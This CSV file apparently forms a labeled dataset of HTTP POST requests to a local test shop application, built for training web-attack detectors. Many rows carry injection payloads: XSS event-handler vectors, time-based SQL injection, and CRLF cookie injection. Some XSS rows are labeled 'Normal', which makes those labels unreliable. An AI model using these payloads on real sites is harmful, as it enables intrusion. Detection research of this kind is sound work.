Unnamed: 0,Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,length,content,classification,URL,attack_type
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=0AD422F52ADA30FEFF365CD61B4CD1AF,application/x-www-form-urlencoded,Connection: close,Content-Length: 66,modo=entrar&login=cas&pwd=82pe6m77b57i0a+d&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=DBFC0F7F4AE100ABBCED785481CEE090,application/x-www-form-urlencoded,Connection: close,Content-Length: 41,modo=insertar&precio=63&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=64E2197BE5328A9178D4EC9354F0F28B,application/x-www-form-urlencoded,Connection: close,Content-Length: 258,"modo=registro&login=tyner&password=palmario&nombre=Urko&apellidos=Abelli+Blasi&email=gemelli@hiperxxx.asia&dni=12269719R&direccion=C/+Cangas+Del+Narcea,+97,+12?E&ciudad=Villanueva+de+Carazo&cp=29716&provincia=Soria&ntc=7870029061793911&B1=Registrar",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D522DDDABBB726FFF1CB6D763E7D44A0,application/x-www-form-urlencoded,Connection: close,Content-Length: 68,"<style>:target {transform: rotate(180deg);}</style><picture id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></picture>",0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=078B618195EFD87CE4EDDDE7BA988272,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,"<style>:target {color: red;}</style><acronym id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></acronym>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=A838B72CD7E6B136C4951D5748E80F7A,application/x-www-form-urlencoded,Connection: close,Content-Length: 256,"modo=registro&login=esite&password=numeradora&nombre=Odelia&apellidos=Macuare+Ribes&email=herrera@silver-knights.tz&dni=34575761E&direccion=Calle+Marques+De+Montevirgen,+183+&ciudad=Cubilla&cp=46841&provincia=Barcelona&ntc=6759860992373102&B1=Registrar",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=84EC3A824B4EDF5B82C300AF54850745,application/x-www-form-urlencoded,Connection: close,Content-Length: 39,modo=insertar&precio=4673&B1A=Confirmar,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=106105BE8228A104F21A07811E692170,application/x-www-form-urlencoded,Connection: close,Content-Length: 59,modo=entrar&login=waldon&pwd=A6br9442&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5593BE577A8AFA9E860BAB5CF5BB4EB4,application/x-www-form-urlencoded,Connection: close,Content-Length: 71,id=3&nombre=Queso+Manchego&precio=39&cantidad=77&B1=A�adir+al+carrito,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1F4E53C6B103B91893C4E8CB4DCA6D14,application/x-www-form-urlencoded,Connection: close,Content-Length: 66,id=3&nombre=Vino+Rioja&precio=85&cantidad=4&B1=A�adir+al+carrito,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=3D475B9DF9BDAD74D34FB2D76CA3FCEA,application/x-www-form-urlencoded,Connection: close,Content-Length: 114,modo=insertar&precio=1979&B1=paros%22%20style=%22background:url(javascript:alert('Paros')),1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=30C135377D070C408E0EE0CEB34B88E0,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,modo=insertar&precio=3615&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D4F2F3FB5F346285F3BBC08CAD0A2759,application/x-www-form-urlencoded,Connection: close,Content-Length: 240,<svg><p onload=alert(1)></p>,0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=AECBC5450372938C8169E69CB5F45279,application/x-www-form-urlencoded,Connection: close,Content-Length: 71,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><slot id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></slot>",0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=077AB46952355FD368868F3756C41578,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,modo=insertar&precio=1299&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=597A3818F9DF4698A66DE9958DABD62B,application/x-www-form-urlencoded,Connection: close,Content-Length: 260,"<table onbeforepaste=""alert(1)"" contenteditable>test</table>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F94EDCA49366B4402C2CD95E49B98D76,application/x-www-form-urlencoded,Connection: close,Content-Length: 289,"modo=registro&login=erh-huan4&password=+&nombre=Basiana&apellidos=Castany+Bigorra&email=balsamo@chicashumedas.aw&dni=81192846V&direccion=Urbanizacion+Santo+Domingo+De+La+Calzada+113+6H&ciudad=Alberguer�a+de+Arga��n,+La&cp=22760&provincia=Segovia&ntc=0768342745697395&B1=Registrar",1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=7C2D3F9F75262B058B8586EE585AA765,application/x-www-form-urlencoded,Connection: close,Content-Length: 71,id=1&nombre=Queso+Manchego&precio=85&cantidad=36&B1=A�adir+al+carrito,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5C1DEAA207A4F4F238A841FA9A30BBD0,application/x-www-form-urlencoded,Connection: close,Content-Length: 58,modo=entrar&login=ramesh&pwd=cANE5o&remember=off&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F5EE5B58903DF7312C0B3CA8E1F8F3F9,application/x-www-form-urlencoded,Connection: close,Content-Length: 255,"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=FD5282C4D1EB04A7B503A8F2DB5559E2,application/x-www-form-urlencoded,Connection: close,Content-Length: 144,modo=entrar&login=ness&pwd=excuSAdor&remember=offparos%22%20style=%22background:url(javascript:alert('Paros'))&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6D5BBA1F87785EF6E31A955D8434B83E,application/x-www-form-urlencoded,Connection: close,Content-Length: 242,<strong id=x tabindex=1 onfocusin=alert(1)></strong>,0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6E51E000CA5A792932BFC55D58BC0395,application/x-www-form-urlencoded,Connection: close,Content-Length: 62,<details ontoggle=alert(1) open>test</details>,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
Anomalous,PUT,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,,"x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:9090,JSESSIONID=1ECAD85C620A72D137CB6B3DC38A7E28,application/x-www-form-urlencoded,Connection: close,Content-Length: 61,modo=entrar&login=anoop&pwd=767�fic6&remember=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=73E73B8CF4402A4DB45075A0DEEAAC4A,application/x-www-form-urlencoded,Connection: close,Content-Length: 48,modo=insertar&precio=6244&B1=Pasar+por+caja%20,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=AD30C48E714266716EA13311F212B848,application/x-www-form-urlencoded,Connection: close,Content-Length: 124,modo=entrar&login=dedie&pwd=M50879RIST44&remember=bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E2C289DC3EF0E64B03A63DD7EF604C34,application/x-www-form-urlencoded,Connection: close,Content-Length: 65,modo=entrar&login=shibo&pwd=3l8rinet03ta&remember=on/&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=BB80228D768B8173A9146AF1E7B7E051,application/x-www-form-urlencoded,Connection: close,Content-Length: 285,"modo=registro&login=markland&password=6os878rn8&nombre=Nolsaco&apellidos=Zarzalejo+Vendrell&email=coulson.koster@lasiestacreativa.ph&dni=17456236H&direccion=Plza.+De+Los+Jardinillos+75,+&ciudad=Esguevillas+de+Esgueva&cp=34757&provincia=A+Coru�a&ntcA=2659545873561160&B1=Registrar",1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=442CC36DB5F1DE47786FD3F8FAA9CDC6,application/x-www-form-urlencoded,Connection: close,Content-Length: 64,modo=entrar&login=tilton&pwd=reco+nocida&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C0F73DFD559F3CE9FA77FFF1CB527EF3,application/x-www-form-urlencoded,Connection: close,Content-Length: 114,"modo=','0','0','0','0');waitfor+delay+'0:0:15';--&precio=9014&B1=Confirmar",1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F8C629546F49CB02A43FCD6CC0122008,application/x-www-form-urlencoded,Connection: close,Content-Length: 118,modo=entrar&login=tine&pwd=v�L70am4390any%0ASet-cookie%3A+Tamper%3D1041264011025374727&remember=on&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E4A829169096DB8676455D2F45F1375A,application/x-www-form-urlencoded,Connection: close,Content-Length: 40,modo=insertar&precio=540&B1=Confirmar/,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=514E96DA3FEB24E32E2D3514E66C2B0D,application/x-www-form-urlencoded,Connection: close,Content-Length: 253,"modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam@easyviaggio.com.km&dni=56876585T&direccion=Calle+Juan+Montilla,+50+1-A&ciudad=Paterna&cp=1949A&provincia=Navarra&ntc=9173328900592385&B1=Registrar",1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=9EBA3F7B5FD82DC57FD66F9E8DEA7D2E,application/x-www-form-urlencoded,Connection: close,Content-Length: 76,id=3/&nombre=Jam�n+Ib�rico&precio=85&cantidad=1&B1=A�adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=7035B875F261904D2477820D485BAB84,application/x-www-form-urlencoded,Connection: close,Content-Length: 230,"modo=registro&login=dafoe&password=p81i4UEr3O&nombre=Solano&apellidos=Muntadas&email=leyton@intg.tk&dni=34853143R&direccion=Pla�a+Esplanada,+S/N+13-D&ciudad=Oco&cp=05145&provincia=Zaragoza&ntc=8871403311691449&B1=Registrar",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1F8446185BD94B2DC7CB4E7C9DE630B9,application/x-www-form-urlencoded,Connection: close,Content-Length: 278,"modo=registro&login=kangning&password=635l82rab74id35&nombre=Alexsandra&apellidos=Basset+Ramos&email=campanini-adamson@barebackspain.kh&dni=39509298J&direccion=Travesia+San+Lazaro,+86+&ciudad=Caba�as+del+Castillo&cp=09471&provincia=Burgos&ntc=9584356702291868&B1=Registrar",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=0DF542911E9C492965D5B482B703750C,application/x-www-form-urlencoded,Connection: close,Content-Length: 259,"<video oncanplaythrough=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=75BF307C39673DE29EB02A0A9DE76F72,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,modo=insertar&precio=6991&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=9096CC714BC18D83DBA3013E67D7BFC6,application/x-www-form-urlencoded,Connection: close,Content-Length: 80,modo=insertar&precio=';waitfor+delay+'0:0:15';--&B1=Pasar+por+caja,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C5C48782BE0E1FA8B93D3588EE7C1A92,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,modo=insertar&precioA=672&B1=Confirmar,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=13E67B10549FE409EE2089CEBE529814,application/x-www-form-urlencoded,Connection: close,Content-Length: 233,<hgroup onfocusout=alert(1) tabindex=1 id=x></hgroup><input autofocus>,0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=202CD83B20EFDDA40ECF2AC1833A3E9E,application/x-www-form-urlencoded,Connection: close,Content-Length: 236,modo=registro&login=vehling&password=cargadas&nombre=Rodipo&apellidos=Peteiro&email=szmidt@surcosur.id&dni=64709043S&direccion=Calle+Ourense+119+5?F&ciudad=Puerto+Real&cp=2632A&provincia=Guadalajara&ntc=0132612345545070&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
